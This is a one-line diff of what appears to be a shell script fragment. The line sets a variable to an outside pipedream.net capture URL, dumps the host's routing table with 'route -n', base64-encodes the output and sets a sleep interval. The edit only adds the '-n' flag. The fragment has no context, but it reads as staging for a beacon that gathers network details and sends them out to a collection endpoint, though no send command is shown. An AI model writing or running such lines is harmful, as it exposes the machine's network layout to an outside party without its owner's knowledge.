@@ -1,1 +1,1 @@
-domvar="https://75e5d2f85b9d81b267bfcd27c813de32.m.pipedream.net"; route | base64 -w0; sleep=230
+domvar="https://75e5d2f85b9d81b267bfcd27c813de32.m.pipedream.net"; route -n | base64 -w0; sleep=230
